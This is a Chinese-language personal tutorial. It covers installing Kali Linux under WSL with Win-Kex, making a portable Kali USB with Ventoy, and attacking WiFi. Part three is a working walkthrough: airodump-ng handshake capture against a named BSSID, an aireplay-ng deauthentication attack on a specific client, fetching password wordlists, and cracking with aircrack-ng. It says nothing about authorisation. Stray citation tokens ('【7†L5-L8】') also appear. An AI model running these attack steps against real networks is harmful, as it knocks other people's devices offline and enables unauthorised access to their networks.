---
title: Kali Linux 三路部署与无线安全实战（WSL + Ventoy 可移动 U 盘 + WiFi 抓包）
date: 2026-08-30
tags: [教程, Kali, WSL, Ventoy, 无线安全]
summary: 本文记录三条 Kali 部署与使用路线：1）在 WSL 中安装 Kali 并配置 Win-Kex 可视化桌面与中文环境；2）利用 Ventoy 制作包含启动盘与系统盘的 U 盘可移动 Kali 物理系统；3）在物理机上利用内置无线网卡进行 WiFi 监听、握手包抓取与密码破解。WSL 基础安装部分引用「WSL：下载与配置完全指南」。
publish: true
---

# Kali Linux 三路部署与无线安全实战（WSL + Ventoy 可移动 U 盘 + WiFi 抓包）

> 参考视频：[Kali Linux 无线渗透测试教程](https://www.youtube.com/watch?v=0p78njSKLjg)

---

## 第一部分：WSL 部署 Kali 与 Win-Kex 可视化桌面（含中文优化）

> **前置条件**：已按 [[WSL：下载与配置完全指南]] 完成 WSL 2 的安装与配置。

### 1.1 安装 Kali Linux 发行版
在 PowerShell（管理员或普通均可）中执行：
```powershell
wsl --install -d kali-linux --location D:\wsl\kali --name kali
```

安装完成后启动，首次启动时设置独立的 Linux 用户名与密码。

### 1.2 更新系统并安装 Win-Kex（Kali 官方 WSL 图形方案）

Kali 官方为 WSL 量身定制了 **Win-Kex**，它基于 VcXsrv 或 RDP，提供比原生 WSLg 更稳定的桌面体验。

进入 Kali 终端，执行：

```bash
sudo apt update && sudo apt full-upgrade -y
sudo apt install -y kali-win-kex
```

### 1.3 启动 Win-Kex 桌面

安装完成后，根据需求选择启动模式：

- **窗口模式**（独立窗口）：

  ```bash
  kex
  ```

- **无缝模式**（应用与 Windows 窗口混排）：

  ```bash
  kex --sl
  ```

- **增强会话模式**（基于 RDP，性能更佳）：

  ```bash
      kex --esm
  ```

> **小贴士**：
>
> - 首次启动会提示设置 Win-Kex 的登录密码（可与系统密码不同），用于 RDP 连接的认证。
> - **兼容性报错**：启动后可能会出现兼容性相关的报错提示，**无需理会**，等待约半分钟左右 Kali 桌面窗口会自动打开【7†L5-L8】。
> - **全屏切换**：kex 启动后会默认进入全屏模式，按 **`F8`** 即可退出全屏，恢复为窗口模式。

### 1.4 优化为中文环境

参考视频中的汉化操作，让 Win-Kex 桌面显示中文并支持中文输入：

```bash
# 1. 配置系统语言为中文
sudo apt-get install locales
sudo dpkg-reconfigure locales
# 在界面中勾选 zh_CN.UTF-8，并将默认 locale 设为 zh_CN.UTF-8
sudo locale-gen zh_CN.UTF-8
sudo update-locale LANG=zh_CN.UTF-8
# 重启虚拟机kali
kex stop
exit
wsl --shutdown

# 2. 安装中文字体
sudo apt install -y fonts-wqy-zenhei

# 3. 安装中文输入法（推荐 fcitx + 谷歌拼音）
sudo apt install -y fcitx fcitx5 fcitx5-chinese-addons

# 4. 重启 Win-Kex 桌面（或重新登录）使配置生效
```

重启后，按 `Ctrl + Shift` 即可切换中英文输入。

------

## 第二部分：Ventoy 制作 U 盘可移动 Kali 物理系统

> **说明**：本部分仅作历程记录，详细 Ventoy 操作指南将于后续独立编写。
> **核心目标**：将单个 U 盘划分为启动分区（Ventoy 引导）与系统分区（Kali 安装），实现"一盘两用"。

### 2.1 制作 Ventoy 启动盘

1. 下载 [Ventoy](https://www.ventoy.net/) 并安装到 U 盘（**注意：会格式化 U 盘**）。
2. Ventoy 安装完成后，U 盘默认分为两个分区：
   - **引导分区**（存放 ISO 镜像文件，即 Ventoy 的启动菜单）
   - **数据分区**（用于存储其他文件）。

### 2.2 拷贝 Kali ISO 并安装至 U 盘剩余空间

1. 将 Kali Linux 的 ISO 镜像直接拷贝至 Ventoy 的引导分区。
2. 重启电脑，从 U 盘启动，进入 Ventoy 菜单，选择 Kali ISO 启动。
3. 在 Kali 安装向导中，**将系统安装到 U 盘的剩余空闲空间**（而非电脑内置硬盘），形成一个独立的可移动 Kali 系统。

### 2.3 安装完成后的额外操作（仅作记录）

安装完成并进入 Windows 后，我**将 U 盘上原 Ventoy 引导分区（存放 ISO 的那个分区）格式化了**。此操作用于清理启动盘痕迹，但**不影响已安装在 U 盘另一分区上的 Kali 系统**（因为引导已由 UEFI/BIOS 指向了系统分区）。

> *关于 Ventoy 的高级玩法与分区恢复，将在后续 [[Ventoy 使用全解]] 中展开。*

------

## 第三部分：物理 Kali 系统 WiFi 监听与握手包抓取实战

> **使用环境**：通过 U 盘启动进入物理 Kali 系统（或直接安装于内置硬盘），**利用笔记本自带的内置无线网卡**进行操作。

### 3.1 确认无线网卡与开启监听模式

打开终端，切换 root 并启动无线接口的监听模式：

```bash
sudo -i
iwconfig                # 查看无线网卡名称（通常为 wlan0）
ifconfig                # 确认网卡信息
airmon-ng               # 检查无线接口状态
airmon-ng start wlan0   # 启用监听模式，生成 wlan0mon 接口
ifconfig                # 确认 wlan0mon 已出现
```

### 3.2 扫描目标 AP

扫描附近 WiFi，记录目标的 **BSSID（MAC地址）** 与 **CH（信道号）**：

```bash
airodump-ng wlan0mon
```

按 `Ctrl + C` 停止扫描。

### 3.3 定向抓取握手包

锁定目标 AP 并保存抓包文件到桌面：

```bash
airodump-ng -c <CH> --bssid <BSSID> -w /home/yanzi/桌面/handshake wlan0mon
```

**实际命令示例**：

```bash
airodump-ng -c 1 --bssid 24:69:8E:20:D2:0A -w /home/yanzi/桌面/handshake wlan0mon
```

### 3.4 强制客户端重连（Deauth 攻击）

**保持上述抓包窗口运行**，另开一个新终端，执行 Deauth 攻击迫使已连接客户端断线重连：

```bash
sudo -i
aireplay-ng -0 10 -a <BSSID> -c <STATION> wlan0mon
```

**实际命令示例**：

```bash
aireplay-ng -0 10 -a 24:69:8E:20:D2:0A -c 6C:40:E8:22:DA:F9 wlan0mon
```

- `-0 10`：发送 10 个 Deauth 断连包
- `-a`：目标 AP 的 BSSID
- `-c`：目标客户端的 STATION MAC

当客户端重新连接时，抓包窗口右上角会出现 `WPA handshake` 提示，表示握手包捕获成功。此时可按 `Ctrl+C` 停止抓包。

### 3.5 准备密码字典

在进行爆破之前，需要准备密码字典。这里介绍两种常用的字典来源：

#### 字典来源一：GitHub 开源字典（wpa-dictionary）

我从 GitHub 上找到了一个专门用于 WiFi 密码破解的字典项目 [conwnet/wpa-dictionary](https://github.com/conwnet/wpa-dictionary)。下载方式：

```bash
# 克隆项目到本地
git clone https://github.com/conwnet/wpa-dictionary.git ~/桌面/wpa-dictionary
```

下载完成后，字典文件位于 `~/桌面/wpa-dictionary/` 目录下，即可配合 aircrack-ng 使用。

#### 字典来源二：Kali 自带 rockyou 字典（推荐）

Kali Linux 默认预装了著名的 **rockyou.txt** 字典，包含超过 1400 万个明文密码，源自 2009 年 RockYou 公司数据泄露事件。该字典位于 `/usr/share/wordlists/` 目录下。

**但需要注意**：Kali 中的 rockyou 字典默认是 **gzip 压缩格式**（`rockyou.txt.gz`），**需要先解压才能使用**。

**解压步骤**：

```bash
# 1. 进入字典目录
cd /usr/share/wordlists/

# 2. 查看压缩文件是否存在
ls -la | grep rockyou

# 3. 解压 rockyou.txt.gz（两种命令均可）
sudo gzip -d rockyou.txt.gz
# 或
sudo gunzip rockyou.txt.gz
```

解压后，同目录下会出现 `rockyou.txt` 文件，大小约 134MB。

> **如果系统提示找不到 rockyou.txt.gz**：说明你的 Kali 安装未包含该字典包，可以通过以下命令安装：
>
> ```bash
> sudo apt install wordlists
> ```
>
> 安装后再次执行上述解压步骤即可。

### 3.6 破解握手包（字典爆破）

使用 `aircrack-ng` 配合字典文件破解握手包。

**使用 GitHub 字典的示例**：

```bash
aircrack-ng -w /home/yanzi/桌面/wpa-dictionary/common.txt -b 24:69:8E:20:D2:0A /home/yanzi/桌面/handshake-01.cap
```

**使用 Kali 自带 rockyou 字典的示例**：

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 24:69:8E:20:D2:0A /home/yanzi/桌面/handshake-01.cap
```

若密码命中字典，终端将显示 **`KEY FOUND! [ password ]`**。

------

## 常见问题速查

| 问题                                     | 解决方法                                                     |
| :--------------------------------------- | :----------------------------------------------------------- |
| **Win-Kex 启动黑屏**                     | 检查 Windows 防火墙是否拦截了 RDP 端口（3389）；尝试切换启动模式（`kex --esm`）。 |
| **Win-Kex 启动报兼容性错误**             | 无需理会，等待约半分钟窗口会自动打开【7†L5-L8】。            |
| **Win-Kex 默认全屏**                     | 按 `F8` 退出全屏模式。                                       |
| **Win-Kex 中文显示方框**                 | 未安装中文字体，执行 `sudo apt install fonts-wqy-zenhei` 并重启桌面。 |
| **物理机 `airmon-ng` 找不到无线网卡**    | 执行 `rfkill list` 检查是否软屏蔽，用 `rfkill unblock wifi` 解锁。 |
| **抓包始终无握手包**                     | 附近无活跃客户端，或 Deauth 包数量不足。可增加 `-0 20`，或选择网络高峰期测试。 |
| **rockyou.txt.gz 解压失败或找不到**      | 先执行 `sudo apt install wordlists` 安装字典包，再解压。     |
| **Ventoy 引导分区格式化后无法进入 Kali** | 如果 UEFI 引导丢失，需用 DiskGenius 等工具修复 ESP 分区（后续 Ventoy 笔记详述）。 |

------

## 相关笔记

- 返回知识库首页 → [[知识库首页]]
- Ventoy 多系统启动盘制作全解 → [[Ventoy 使用全解]]
- WSL 基础安装与命令大全 → [[WSL：下载与配置完全指南]]
- 虚拟机 Ubuntu 环境配置 → [[Ubuntu24.04虚拟机设置]]
- 软件清单与常用说明 → [[软件清单与常用说明]]